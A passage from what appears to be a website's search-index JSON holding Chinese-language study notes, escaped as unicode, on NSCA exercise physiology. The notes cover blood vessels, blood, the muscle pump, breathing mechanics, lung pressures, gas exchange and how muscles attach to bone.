\u52a8\u8109\u7684\u7279\u6027 \uff1a\u7531\u4e8e\u5fc3\u810f\u6cf5\u51fa\u7684\u8840\u6db2\u538b\u529b\u5f88\u5927\uff0c\u52a8\u8109\u9700\u8981\u6709\u5f3a\u58ee\u7684\u808c\u8089\u7ba1\u58c1\u6765\u627f\u53d7\u548c\u9002\u5e94\u8fd9\u79cd\u9ad8\u538b\u3002 \u5c0f\u52a8\u8109\u7684\u4f5c\u7528 \uff1a\u52a8\u8109\u7684\u8f83\u5c0f\u5206\u652f\u53eb\u505a\u5c0f\u52a8\u8109\uff0c\u5b83\u4eec\u63a7\u5236\u8840\u6db2\u6d41\u5165\u6bdb\u7ec6\u8840\u7ba1\u3002\u6bdb\u7ec6\u8840\u7ba1\u662f\u975e\u5e38\u7ec6\u5c0f\u7684\u8840\u7ba1\uff0c\u8d1f\u8d23\u5728\u7ec4\u7ec7\u4e2d\u8fdb\u884c\u7269\u8d28\u4ea4\u6362\u3002 \u8840\u6d41\u8c03\u8282 \uff1a\u5c0f\u52a8\u8109\u5728\u8c03\u8282\u8840\u6db2\u8fdb\u5165\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u7684\u4f5c\u7528\u975e\u5e38\u91cd\u8981\u3002\u5c0f\u52a8\u8109\u7684\u808c\u8089\u7ba1\u58c1\u975e\u5e38\u5f3a\u5927\uff0c\u80fd\u591f\u5b8c\u5168\u95ed\u5408\u5c0f\u52a8\u8109\uff0c\u6216\u8005\u4f7f\u8840\u7ba1\u76f4\u5f84\u6269\u5f20\u5f88\u591a\u500d\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5c0f\u52a8\u8109\u53ef\u4ee5\u6839\u636e\u7ec4\u7ec7\u7684\u9700\u8981\u5927\u5e45\u5ea6\u6539\u53d8\u6bdb\u7ec6\u8840\u7ba1\u7684\u8840\u6d41\u91cf\u3002","title":"\u52a8\u8109"},{"location":"soft/NSCA/#_34","text":"\u6bdb\u7ec6\u8840\u7ba1\u7684\u529f\u80fd\u662f\u4fc3\u8fdb\u8840\u6db2\u548c\u5404\u79cd\u8eab\u4f53\u7ec4\u7ec7\u6db2\u95f4\u7684\u6c27\u6c14\u3001\u6db2\u4f53\u3001\u8425\u517b\u7269\u8d28\u3001\u7535\u89e3\u8d28\u3001\u6fc0\u7d20\u548c\u5176\u4ed6\u7269\u8d28\u7684\u4ea4\u6362\u3002\u6bdb\u7ec6\u8840\u7ba1\u58c1\u975e\u5e38\u8584\uff0c\u5e76\u5bf9\u4ee5\u4e0a\u7269\u8d28\u5177\u6709\u6e17\u900f\u6027\uff0c\u4f46\u4e0d\u662f\u5bf9\u6240\u6709\u7684\u7269\u8d28\u90fd\u5177\u6709\u6e17\u900f\u6027.","title":"\u6bdb\u7ec6\u8840\u7ba1"},{"location":"soft/NSCA/#_35","text":"\u5c0f\u9759\u8109 \u4ece\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u6536\u96c6\u8840\u6db2\uff0c\u5e76\u9010\u6e10\u6c47\u96c6\u6210\u66f4\u5927\u7684 \u9759\u8109 \uff0c\u9759\u8109\u5c06\u8840\u6db2\u8f93\u9001\u56de\u5fc3\u810f\u3002\u867d\u7136\u5c0f\u9759\u8109\u4e5f\u6709\u808c\u8089\u6027\u8840\u7ba1\u58c1\uff0c\u4f46\u56e0\u4e3a\u9759\u8109\u7cfb\u7edf\u4e2d\u7684\u538b\u5f3a\u5f88\u4f4e\uff0c\u6240\u4ee5\u9759\u8109\u808c\u8089\u7ba1\u58c1\u5f88\u8584\u3002\u8fd9\u4f7f\u9759\u8109\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u6536\u7f29\u6216\u6269\u5f20\uff0c\u4ece\u800c\u4f5c\u4e3a\u50a8\u5b58\u5668\uff0c\u50a8\u5b58\u6216\u591a\u6216\u5c11\u7684\u8840\u6db2\u3002\u6b64\u5916\uff0c\u67d0\u4e9b\u9759\u8109(\u4f8b\u5982\u817f\u90e8\u9759\u8109)\u5185\u6709\u5355\u5411\u7684\u9759\u8109\u74e3\uff0c\u901a\u8fc7\u963b\u6b62\u8840\u6db2\u9006\u6d41\u6765\u8f85\u52a9\u7ef4\u6301\u9759\u8109\u8840\u56de\u6d41\u3002 \u5fc3\u8840\u7ba1\u7cfb\u7edf\u8fd0\u8f93\u8425\u517b\u7269\u8d28\u5e76\u6e05\u9664\u5e9f\u7269\uff0c\u540c\u65f6\u6709\u52a9\u4e8e\u7ef4\u6301\u8eab\u4f53\u5185\u73af\u5883\u3002\u8840\u6db2\u5c06\u6c27\u6c14\u4ece\u80ba\u90e8\u8f93\u9001\u5230\u7ec4\u7ec7\u4ee5\u7528\u4e8e\u7ec6\u80de\u4ee3\u8c22\uff0c\u5e76\u5c06\u4e8c\u6c27\u5316\u78b3(\u6700\u591a\u7684\u4ee3\u8c22\u526f\u4ea7\u7269)\u4ece\u7ec4\u7ec7\u8f93\u9001\u5230\u80ba\u90e8\u547c\u51fa\u3002","title":"\u9759\u8109"},{"location":"soft/NSCA/#_36","text":"\u8840\u6db2\u7684\u4e24\u4e2a\u6700\u91cd\u8981\u7684\u529f\u80fd \uff1a \u8fd0\u9001\u6c27\u6c14 \uff1a\u8840\u6db2\u5c06\u6c27\u6c14\u4ece\u80ba\u90e8\u8fd0\u9001\u5230\u8eab\u4f53\u7684\u5404\u4e2a\u7ec4\u7ec7\uff0c\u8fd9\u4e9b\u6c27\u6c14\u7528\u4e8e\u7ec6\u80de\u4ee3\u8c22\u3002 \u6e05\u9664\u4e8c\u6c27\u5316\u78b3 \uff1a\u8840\u6db2\u4ece\u7ec4\u7ec7\u4e2d\u5e26\u8d70\u4ee3\u8c22\u4ea7\u751f\u7684\u4e8c\u6c27\u5316\u78b3\uff0c\u5e76\u5c06\u5b83\u8fd0\u9001\u5230\u80ba\u90e8\u4ee5\u4fbf\u547c\u51fa\u3002 \u6c27\u6c14\u7684\u8fd0\u8f93 \uff1a\u6c27\u6c14\u901a\u8fc7\u8840\u7ea2\u86cb\u767d\u6765\u8fd0\u8f93\u3002\u8840\u7ea2\u86cb\u767d\u662f\u4e00\u79cd\u5b58\u5728\u4e8e\u7ea2\u7ec6\u80de\u4e2d\u7684\u94c1\u86cb\u767d\u5206\u5b50\u3002 \u8840\u7ea2\u86cb\u767d\u7684\u5176\u4ed6\u4f5c\u7528 \uff1a \u9178\u78b1\u7f13\u51b2\u6db2 \uff1a\u8840\u7ea2\u86cb\u767d\u8fd8\u80fd\u8c03\u8282\u8840\u6db2\u4e2d\u7684\u6c22\u79bb\u5b50\u6d53\u5ea6\uff0c\u8d77\u5230\u9178\u78b1\u7f13\u51b2\u6db2\u7684\u4f5c\u7528\u3002\u8fd9\u5bf9\u7ec6\u80de\u5185\u5316\u5b66\u53cd\u5e94\u7684\u901f\u7387\u975e\u5e38\u91cd\u8981\u3002 \u7ea2\u7ec6\u80de\u7684\u7ec4\u6210\u548c\u5176\u4ed6\u529f\u80fd \uff1a \u78b3\u9178\u9150\u9176 \uff1a\u7ea2\u7ec6\u80de\u4e2d\u542b\u6709\u5927\u91cf\u7684\u78b3\u9178\u9150\u9176\uff0c\u8fd9\u79cd\u9176\u53ef\u4ee5\u50ac\u5316\u4e8c\u6c27\u5316\u78b3\u548c\u6c34\u4e4b\u95f4\u7684\u53cd\u5e94\uff0c\u4ece\u800c\u4fc3\u8fdb\u4e8c\u6c27\u5316\u78b3\u7684\u6e05\u9664\u3002","title":"\u8840\u6db2"},{"location":"soft/NSCA/#_37","text":"\u808c\u8089\u6cf5\u7684\u529f\u80fd \uff1a\u808c\u8089\u6cf5\uff08\u4e5f\u53eb\u9759\u8109\u6cf5\uff09\u662f\u4e00\u4e2a\u5728\u808c\u8089\u6536\u7f29\u65f6\u8f85\u52a9\u4f53\u6db2\u5faa\u73af\u7684\u7cfb\u7edf\u3002 \u5de5\u4f5c\u673a\u5236 \uff1a\u808c\u8089\u6cf5\u548c\u5177\u6709\u9759\u8109\u74e3\u7684\u9759\u8109\u7cfb\u7edf\u4e00\u8d77\u5de5\u4f5c\u3002\u5f53\u808c\u8089\u6536\u7f29\u65f6\uff0c\u4f1a\u6324\u538b\u9759\u8109\u3002\u7531\u4e8e\u9759\u8109\u4e2d\u6709\u9759\u8109\u74e3\uff0c\u8840\u6db2\u53ea\u80fd\u671d\u4e00\u4e2a\u65b9\u5411\u6d41\u52a8\uff0c\u56e0\u6b64\u8840\u6db2\u88ab\u6324\u538b\u56de\u5fc3\u810f\u3002 \u8fd0\u52a8\u540e\u7684\u4f5c\u7528 \uff1a\u8fd9\u79cd\u673a\u5236\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u4eba\u5728\u8fd0\u52a8\u540e\u9700\u8981\u7ee7\u7eed\u8d70\u52a8\uff0c\u4ee5\u9632\u6b62\u8840\u6db2\u5728\u4e0b\u80a2\u79ef\u805a\u3002\u5982\u679c\u8840\u6db2\u5728\u4e0b\u80a2\u79ef\u805a\uff0c\u4f1a\u589e\u52a0\u8840\u6db2\u51dd\u56fa\u7684\u98ce\u9669\u3002 \u957f\u65f6\u95f4\u9759\u5750\u7684\u6ce8\u610f\u4e8b\u9879 \uff1a\u5728\u957f\u65f6\u95f4\u9759\u5750\u540e\uff0c\u65f6\u4e0d\u65f6\u5730\u6324\u538b\u808c\u8089\u4e5f\u5f88\u91cd\u8981\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fc3\u8fdb\u8840\u6db2\u56de\u6d41\u5230\u5fc3\u810f\uff0c\u907f\u514d\u8840\u6db2\u5728\u4e0b\u80a2\u79ef\u805a\u3002","title":"\u808c\u8089\u6cf5"},{"location":"soft/NSCA/#_38","text":"\u547c\u5438\u7cfb\u7edf\u7684\u4e3b\u8981\u529f\u80fd \uff1a\u547c\u5438\u7cfb\u7edf\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8fdb\u884c\u6c27\u6c14\u548c\u4e8c\u6c27\u5316\u78b3\u7684\u4ea4\u6362\u3002 \u4eba\u7c7b\u547c\u5438\u7cfb\u7edf\u7684\u89e3\u5256\u7ed3\u6784 \uff1a \u5f53\u7a7a\u6c14\u901a\u8fc7\u9f3b\u5b50\u65f6\uff0c\u9f3b\u8154\u6709\u4e09\u4e2a\u529f\u80fd\uff1a\u52a0\u6e29\u3001\u52a0\u6e7f\u548c\u51c0\u5316\u7a7a\u6c14\u3002 \u7136\u540e\u7a7a\u6c14\u901a\u8fc7\u6c14\u7ba1\u3001\u652f\u6c14\u7ba1\u548c\u7ec6\u652f\u6c14\u7ba1\u5230\u8fbe\u80ba\u90e8\u3002 \u6c14\u7ba1\u548c\u652f\u6c14\u7ba1\u7684\u5206\u7c7b \uff1a \u6c14\u7ba1\u88ab\u79f0\u4e3a\u7b2c\u4e00\u7ea7\u547c\u5438\u9053\u3002 \u5de6\u53f3\u4e3b\u652f\u6c14\u7ba1\u4e3a\u7b2c\u4e8c\u7ea7\u547c\u5438\u9053\u3002 \u4e4b\u540e\u7684\u6bcf\u4e00\u4e2a\u5206\u652f\uff08\u7ec6\u652f\u6c14\u7ba1\uff09\u90fd\u662f\u4e0b\u4e00\u7ea7\u547c\u5438\u9053\u3002 \u547c\u5438\u9053\u7684\u5206\u7ea7 \uff1a \u7a7a\u6c14\u6700\u7ec8\u5230\u8fbe\u80ba\u6ce1\u4e4b\u524d\uff0c\u9700\u8981\u7ecf\u8fc7\u5927\u7ea623\u7ea7\u547c\u5438\u9053\u3002 \u5728\u80ba\u6ce1\u4e2d\uff0c\u6c14\u4f53\u901a\u8fc7\u547c\u5438\u8fdb\u884c\u4ea4\u6362\u3002","title":"\u547c\u5438\u7cfb\u7edf"},{"location":"soft/NSCA/#_39","text":"\u80ba\u5bb9\u79ef\u7684\u63a7\u5236 \uff1a\u7a7a\u6c14\u6d41\u52a8\u91cf\u53ca\u8fdb\u51fa\u80ba\u7684\u7a7a\u6c14\u603b\u91cf\u662f\u7531\u80ba\u5bb9\u79ef\u7684\u589e\u5927\u548c\u7f29\u5c0f\u63a7\u5236\u7684\u3002\u80ba\u90e8\u672c\u8eab\u4e0d\u80fd\u81ea\u4e3b\u5730\u6269\u5f20\u548c\u6536\u7f29\uff0c\u800c\u662f\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u8fdb\u884c\uff1a \u8188\u819c\u7684\u6536\u7f29\u548c\u8212\u5f20 \uff1a\u8188\u819c\u7684\u8fd0\u52a8\u6539\u53d8\u80f8\u8154\u7684\u4f53\u79ef\u3002 \u808b\u9aa8\u7684\u5347\u9ad8\u548c\u4e0b\u843d \uff1a\u6539\u53d8\u80f8\u8154\u524d\u540e\u76f4\u5f84\u3002 \u5e73\u9759\u547c\u5438 \uff1a\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5e73\u9759\u547c\u5438\u51e0\u4e4e\u5b8c\u5168\u4f9d\u8d56\u8188\u819c\u7684\u8fd0\u52a8\u5b8c\u6210\u3002 \u5438\u6c14\u65f6 \uff1a\u8188\u808c\u6536\u7f29\uff0c\u80f8\u8154\u4ea7\u751f\u8d1f\u538b\uff08\u771f\u7a7a\uff09\uff0c\u7a7a\u6c14\u88ab\u5438\u5165\u80ba\u90e8\u3002 \u547c\u6c14\u65f6 \uff1a\u8188\u819c\u653e\u677e\uff0c\u80ba\u90e8\u548c\u5468\u56f4\u7ed3\u6784\u7684\u5f39\u6027\u56de\u7f29\u4f7f\u7a7a\u6c14\u88ab\u6392\u51fa\u3002 \u7528\u529b\u547c\u5438 \uff1a \u5728\u7528\u529b\u547c\u5438\u65f6\uff0c\u4ec5\u9760\u5f39\u6027\u56de\u7f29\u4e0d\u8db3\u4ee5\u4ea7\u751f\u8db3\u591f\u7684\u547c\u5438\u53cd\u5e94\u3002 \u5438\u6c14\u808c \uff1a\u9700\u8981\u989d\u5916\u7684\u529b\u91cf\u4e0a\u63d0\u80f8\u5ed3\u3002\u5438\u6c14\u808c\u5305\u62ec\u808b\u95f4\u5916\u808c\u3001\u80f8\u9501\u4e73\u7a81\u808c\u3001\u524d\u952f\u808c\u548c\u659c\u89d2\u808c\u3002 \u547c\u6c14\u808c \uff1a\u9700\u8981\u989d\u5916\u7684\u529b\u91cf\u538b\u7f29\u80f8\u5ed3\u3002\u547c\u6c14\u808c\u5305\u62ec\u8179\u808c\uff08\u8179\u76f4\u808c\u3001\u8179\u5185\u659c\u808c\u3001\u8179\u5916\u659c\u808c\u548c\u8179\u6a2a\u808c\uff09\u548c\u808b\u95f4\u5185\u808c\u3002 \u4e0a\u63d0\u80f8\u5ed3 \uff1a\u4e0a\u63d0\u80f8\u5ed3\u4f7f\u80f8\u9aa8\u5411\u524d\u79fb\u52a8\u5e76\u8fdc\u79bb\u810a\u67f1\uff0c\u4ece\u800c\u589e\u5927\u80f8\u8154\u5bb9\u91cf\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c\u5438\u6c14\u808c\u548c\u547c\u6c14\u808c\u5728\u547c\u5438\u8fc7\u7a0b\u4e2d\u53d1\u6325\u7740\u91cd\u8981\u4f5c\u7528\u3002\u5438\u6c14\u808c\u5e2e\u52a9\u6269\u5f20\u80f8\u8154\uff0c\u5438\u5165\u7a7a\u6c14\uff1b\u547c\u6c14\u808c\u5e2e\u52a9\u538b\u7f29\u80f8\u8154\uff0c\u6392\u51fa\u7a7a\u6c14\u3002\u5e73\u9759\u547c\u5438\u4e3b\u8981\u4f9d\u9760\u8188\u819c\u7684\u8fd0\u52a8\uff0c\u800c\u7528\u529b\u547c\u5438\u65f6\u5219\u9700\u8981\u8fd9\u4e9b\u808c\u8089\u7684\u989d\u5916\u529b\u91cf\u6765\u8f85\u52a9\u3002","title":"\u7a7a\u6c14\u4ea4\u6362"},{"location":"soft/NSCA/#_40","text":"\u80f8\u819c\u8154\u5185\u538b\u7684\u5b9a\u4e49 \uff1a\u80f8\u819c\u8154\u5185\u538b\u662f\u6307\u4f4d\u4e8e\u80ba\u8868\u9762\u7684\u80f8\u819c\u810f\u5c42\u4e0e\u4f4d\u4e8e\u80f8\u58c1\u5185\u8868\u9762\u7684\u80f8\u819c\u58c1\u5c42\u4e4b\u95f4\u72ed\u7a84\u7a7a\u9699\u7684\u538b\u529b\u3002 \u538b\u529b\u7279\u6027 \uff1a\u8fd9\u4e2a\u538b\u529b\u901a\u5e38\u662f\u5fae\u5f31\u7684\u8d1f\u538b\u3002 \u8d1f\u538b\u7684\u4f5c\u7528 \uff1a \u5438\u6c14\u65f6 \uff1a\u56e0\u4e3a\u80ba\u662f\u4e00\u79cd\u5f39\u6027\u7ed3\u6784\uff0c\u80f8\u8154\u7684\u6269\u5f20\u4f1a\u62c9\u52a8\u80ba\u7684\u8868\u9762\uff0c\u4ea7\u751f\u66f4\u591a\u7684\u8d1f\u538b\u3002\u8fd9\u79cd\u8d1f\u538b\u4f1a\u5e2e\u52a9\u5438\u6c14\uff0c\u4f7f\u7a7a\u6c14\u8fdb\u5165\u80ba\u90e8\u3002 \u547c\u6c14\u65f6 \uff1a\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u76f8\u53cd\u7684\uff0c\u80f8\u8154\u6536\u7f29\uff0c\u8d1f\u538b\u51cf\u5c0f\uff0c\u7a7a\u6c14\u88ab\u6392\u51fa\u80ba\u90e8\u3002 \u80f8\u819c\u8154\u5185\u7684\u8d1f\u538b\u5728\u547c\u5438\u8fc7\u7a0b\u4e2d\u8d77\u5230\u5173\u952e\u4f5c\u7528\u3002\u5438\u6c14\u65f6\uff0c\u80f8\u8154\u7684\u6269\u5f20\u589e\u52a0\u8d1f\u538b\uff0c\u5e2e\u52a9\u7a7a\u6c14\u8fdb\u5165\u80ba\u90e8\uff1b\u547c\u6c14\u65f6\uff0c\u80f8\u8154\u6536\u7f29\uff0c\u8d1f\u538b\u51cf\u5c0f\uff0c\u7a7a\u6c14\u6392\u51fa\u3002\u8fd9\u79cd\u538b\u529b\u53d8\u5316\u4f7f\u5f97\u547c\u5438\u8fc7\u7a0b\u5f97\u4ee5\u987a\u5229\u8fdb\u884c\u3002","title":"\u80f8\u819c\u8154\u5185\u538b"},{"location":"soft/NSCA/#_41","text":"\u80ba\u5185\u538b\u7684\u5b9a\u4e49 \uff1a\u80ba\u5185\u538b\u662f\u6307\u5728\u547c\u5438\u9053\u6253\u5f00\u4e14\u6ca1\u6709\u7a7a\u6c14\u8fdb\u51fa\u80ba\u90e8\u65f6\uff0c\u80ba\u6ce1\u5185\u7684\u538b\u529b\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u547c\u5438\u9053\u5185\u6240\u6709\u90e8\u5206\u7684\u538b\u529b\uff0c\u5305\u62ec\u80ba\u6ce1\u7684\u538b\u529b\uff0c\u90fd\u7b49\u4e8e\u5927\u6c14\u538b\u3002 \u5438\u6c14\u548c\u547c\u6c14\u4e2d\u7684\u80ba\u5185\u538b\u53d8\u5316 \uff1a \u5438\u6c14\u65f6 \uff1a\u4e3a\u4e86\u4f7f\u7a7a\u6c14\u8fdb\u5165\u80ba\u90e8\uff0c\u80ba\u5185\u538b\u5fc5\u987b\u4e0b\u964d\u5230\u7565\u4f4e\u4e8e\u5927\u6c14\u538b\u7684\u503c\u3002 \u547c\u6c14\u65f6 \uff1a\u4e3a\u4e86\u4f7f\u7a7a\u6c14\u6392\u51fa\u80ba\u90e8\uff0c\u80ba\u5185\u538b\u5fc5\u987b\u9ad8\u4e8e\u5927\u6c14\u538b\u3002 \u80fd\u91cf\u6d88\u8017 \uff1a \u9759\u606f\u72b6\u6001\u4e0b\u7684\u6b63\u5e38\u547c\u5438 \uff1a\u5728\u9759\u606f\u72b6\u6001\u4e0b\u6b63\u5e38\u547c\u5438\u65f6\uff0c\u8eab\u4f53\u6d88\u8017\u603b\u80fd\u91cf\u76843%\u52305%\u7528\u4e8e\u80ba\u901a\u6c14\uff08\u547c\u5438\u8fc7\u7a0b\uff09\u3002 \u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u4e2d\u7684\u80fd\u91cf\u6d88\u8017 \uff1a\u5728\u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u4e2d\uff0c\u6240\u9700\u7684\u80fd\u91cf\u53ef\u589e\u52a0\u5230\u603b\u80fd\u91cf\u6d88\u8017\u76848%\u523015%\u3002\u5982\u679c\u547c\u5438\u9053\u963b\u529b\u589e\u52a0\uff0c\u4f8b\u5982\u8fd0\u52a8\u8bf1\u53d1\u7684\u54ee\u5598\uff0c\u8fd9\u4e2a\u6bd4\u4f8b\u53ef\u80fd\u4f1a\u66f4\u9ad8\u3002 \u9884\u9632\u63aa\u65bd \uff1a \u7531\u4e8e\u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u53ef\u80fd\u5bf9\u547c\u5438\u7cfb\u7edf\u9020\u6210\u4e00\u5b9a\u7a0b\u5ea6\u7684\u635f\u4f24\uff0c\u5efa\u8bae\u91c7\u53d6\u9884\u9632\u63aa\u65bd\u3002\u8fd9\u5305\u62ec\u7531\u533b\u751f\u4e8b\u5148\u5bf9\u8fd0\u52a8\u5458\u8fdb\u884c\u8bc4\u4f30\uff0c\u4ee5\u786e\u4fdd\u5176\u547c\u5438\u7cfb\u7edf\u5728\u8fd0\u52a8\u4e2d\u80fd\u591f\u6b63\u5e38\u8fd0\u4f5c\u3002 \u80ba\u5185\u538b\u5728\u5438\u6c14\u548c\u547c\u6c14\u8fc7\u7a0b\u4e2d\u5206\u522b\u9700\u8981\u4f4e\u4e8e\u548c\u9ad8\u4e8e\u5927\u6c14\u538b\u4ee5\u4fc3\u8fdb\u7a7a\u6c14\u6d41\u52a8\u3002\u6b63\u5e38\u547c\u5438\u6d88\u8017\u7684\u80fd\u91cf\u8f83\u5c11\uff0c\u4f46\u9ad8\u5f3a\u5ea6\u8fd0\u52a8\u65f6\u547c\u5438\u6240\u9700\u7684\u80fd\u91cf\u4f1a\u663e\u8457\u589e\u52a0\uff0c\u5c24\u5176\u662f\u5f53\u5b58\u5728\u547c\u5438\u9053\u963b\u529b\u65f6\u3002\u56e0\u6b64\uff0c\u9884\u9632\u63aa\u65bd\u548c\u533b\u7597\u8bc4\u4f30\u5bf9\u4e8e\u8fd0\u52a8\u5458\u662f\u5f88\u91cd\u8981\u7684\u3002","title":"\u80ba\u5185\u538b"},{"location":"soft/NSCA/#_42","text":"\u6362\u6c14\u8fc7\u7a0b \uff1a\u5728\u6362\u6c14\u8fc7\u7a0b\u4e2d\uff0c\u6c27\u6c14\u4ece\u80ba\u6ce1\u6269\u6563\u5230\u80ba\u90e8\u8840\u6db2\u4e2d\uff0c\u4e8c\u6c27\u5316\u78b3\u4ece\u8840\u6db2\u6269\u6563\u5230\u80ba\u6ce1\u3002\u8fd9\u662f\u901a\u8fc7\u7b80\u5355\u7684\u968f\u673a\u5206\u5b50\u8fd0\u52a8\uff08\u6269\u6563\uff09\u8fdb\u884c\u7684\u3002 \u6269\u6563\u539f\u7406 \uff1a \u5206\u5b50\u8fd0\u52a8 \uff1a\u6269\u6563\u7684\u80fd\u91cf\u6765\u6e90\u4e8e\u5206\u5b50\u81ea\u8eab\u7684\u52a8\u529b\u5b66\u4f5c\u7528\u3002 \u6d53\u5ea6\u5dee \uff1a\u6c14\u4f53\u4ece\u9ad8\u6d53\u5ea6\u533a\u57df\u5411\u4f4e\u6d53\u5ea6\u533a\u57df\u6269\u6563\u3002 \u5f71\u54cd\u6269\u6563\u901f\u7387\u7684\u56e0\u7d20 \uff1a \u6d53\u5ea6\u5dee \uff1a\u4e24\u79cd\u6c14\u4f53\u7684\u6269\u6563\u901f\u7387\u53d6\u51b3\u4e8e\u5b83\u4eec\u5728\u6bdb\u7ec6\u8840\u7ba1\u548c\u80ba\u6ce1\u4e2d\u7684\u6d53\u5ea6\u3002 \u5206\u538b\u5dee \uff1a\u6bcf\u79cd\u6c14\u4f53\u7684\u5206\u538b\u5dee\u4e5f\u4f1a\u5f71\u54cd\u5176\u6269\u6563\u901f\u7387\u3002 \u9759\u606f\u72b6\u6001\u4e0b\u7684\u6c27\u6c14\u6269\u6563 \uff1a \u6c27\u5206\u538b\u5dee \uff1a\u9759\u606f\u72b6\u6001\u4e0b\uff0c\u80ba\u6ce1\u4e2d\u7684\u6c27\u5206\u538b\u6bd4\u80ba\u6ce1\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u7684\u6c27\u5206\u538b\u9ad8\u7ea660 mmHg\u3002\u56e0\u6b64\uff0c\u6c27\u6c14\u4f1a\u4ece\u80ba\u6ce1\u6269\u6563\u5230\u6bdb\u7ec6\u8840\u7ba1\u4e2d\u7684\u8840\u6db2\u4e2d\u3002 \u4e8c\u6c27\u5316\u78b3\u6269\u6563 \uff1a\u540c\u65f6\uff0c\u4e8c\u6c27\u5316\u78b3\u6cbf\u76f8\u53cd\u65b9\u5411\u6269\u6563\uff0c\u4ece\u8840\u6db2\u6269\u6563\u5230\u80ba\u6ce1\u4e2d\u3002 \u6c14\u4f53\u4ea4\u6362\u7684\u901f\u5ea6 \uff1a\u8fd9\u79cd\u6c14\u4f53\u4ea4\u6362\u8fc7\u7a0b\u975e\u5e38\u8fc5\u901f\uff0c\u53ef\u4ee5\u8ba4\u4e3a\u662f\u77ac\u65f6\u53d1\u751f\u7684\u3002 \u6362\u6c14\u8fc7\u7a0b\u4e2d\u6c27\u6c14\u548c\u4e8c\u6c27\u5316\u78b3\u901a\u8fc7\u80ba\u6ce1\u548c\u6bdb\u7ec6\u8840\u7ba1\u819c\u7684\u6269\u6563\u6765\u8fdb\u884c\u6c14\u4f53\u4ea4\u6362\u3002\u6c27\u6c14\u4ece\u9ad8\u5206\u538b\u7684\u80ba\u6ce1\u6269\u6563\u5230\u4f4e\u5206\u538b\u7684\u8840\u6db2\u4e2d\uff0c\u800c\u4e8c\u6c27\u5316\u78b3\u5219\u4ece\u9ad8\u5206\u538b\u7684\u8840\u6db2\u6269\u6563\u5230\u4f4e\u5206\u538b\u7684\u80ba\u6ce1\u3002\u8fd9\u4e00\u8fc7\u7a0b\u4e3b\u8981\u53d7\u6c14\u4f53\u6d53\u5ea6\u5dee\u548c\u5206\u538b\u5dee\u7684\u9a71\u52a8\uff0c\u5e76\u4e14\u53d1\u751f\u5f97\u975e\u5e38\u8fc5\u901f\u3002","title":"\u547c\u5438\u5176\u4ed6\u4ea4\u6362"},{"location":"soft/NSCA/#_43","text":"\u5728\u9aa8\u9abc\u4e0a\u3002\u4f20\u7edf\u4e0a\uff0c\u89e3\u5256\u5b66\u5bb6\u5c06\u808c\u8089\u7684\u8d77\u70b9\u5b9a\u4e49\u4e3a\u8fd1\u7aef\uff08\u671d\u5411\u8eab\u4f53\u7684\u4e2d\u5fc3\uff09\uff0c \u5e76\u5c06\u5176\u6b62\u70b9\u5b9a\u4e49\u4e3a\u8fdc\u7aef\uff08\u8fdc\u79bb\u8eab\u4f53\u7684\u4e2d\u5fc3\uff09\u3002","title":"\u9aa8\u9abc\u808c\u7cfb\u7edf"},{"location":"soft/NSCA/#_44","text":"\u76f4\u63a5\u9644\u7740 \uff1a\u901a\u5e38\u51fa\u73b0\u5728\u808c\u8089\u7684\u8fd1\u7aef\uff0c\u4e5f\u5c31\u662f\u9760\u8fd1\u8eab\u4f53\u4e2d\u8f74\u7684\u4e00\u7aef\u3002\u8fd9\u91cc\uff0c\u808c\u8089\u7ea4\u7ef4\u76f4\u63a5\u9644\u7740\u5728\u9aa8\u5934\u4e0a\uff0c\u9644\u7740\u9762\u79ef\u8f83\u5927\uff0c\u8fd9\u6837\u529b\u53ef\u4ee5\u5206\u6563\uff0c\u4e0d\u4f1a\u96c6\u4e2d\u5728\u4e00\u4e2a\u70b9\u4e0a\uff0c\u51cf\u5c11\u635f\u4f24\u7684\u98ce\u9669\u3002 \u7ea4\u7ef4\u6027\u9644\u7740 \uff1a\u6bd4\u5982\u808c\u8171\u548c\u808c\u9798\u4e0e\u9aa8\u5468\u56f4\u7684\u7ed3\u7f14\u7ec4\u7ec7\u878d\u5408\u5e76\u8fde\u63a5\u3002\u8fd9\u4e9b\u8fde\u63a5\u901a\u5e38\u4f1a\u6709\u989d\u5916\u7684\u7ea4\u7ef4\u5ef6\u4f38\u5230\u9aa8\u5934\u5185\u90e8\uff0c\u5f62\u6210\u975e\u5e38\u7d27\u5bc6\u7684\u7ed3\u5408\u3002\u8fd9\u79cd\u9644\u7740\u65b9\u5f0f\u975e\u5e38\u7262\u56fa\uff0c\u786e\u4fdd\u808c\u8089\u5728\u7528\u529b\u65f6\u80fd\u591f\u6709\u6548\u5730\u4f20\u9012\u529b\u91cf\u3002","title":"\u808c\u8089\u8fde\u63a5\u5230\u9aa8\u5934\u4e0a\u7684\u65b9\u5f0f"},{"location":"soft/NSCA/#_45","text":"\u51e0\u4e4e\u6240\u6709\u7684\u8eab\u4f53\u52a8\u4f5c\u90fd\u9700\u8981\u591a\u5757\u808c\u8089\u534f\u540c\u5de5\u4f5c\u3002\u4ee5\u4e0b\u662f\u5bf9\u8fd9\u4e9b\u808c\u8089\u89d2\u8272\u7684\u7b80\u5355\u89e3\u91ca\uff1a \u4e3b\u52a8\u808c\uff08\u539f\u52a8\u808c\uff09 \uff1a\u8fd9\u4e9b\u662f\u76f4\u63a5\u53c2\u4e0e\u4ea7\u751f\u52a8\u4f5c\u7684\u808c\u8089\u3002\u4f8b\u5982\uff0c\u5728\u6295\u63b7\u52a8\u4f5c\u4e2d\uff0c\u80b1\u4e09\u5934\u808c\u662f\u4e3b\u52a8\u808c\uff0c\u5b83\u8d1f\u8d23\u4f38\u5c55\u8098\u90e8\u5e76\u52a0\u901f\u6295\u7403\u7684\u52a8\u4f5c\u3002 \u62ee\u6297\u808c 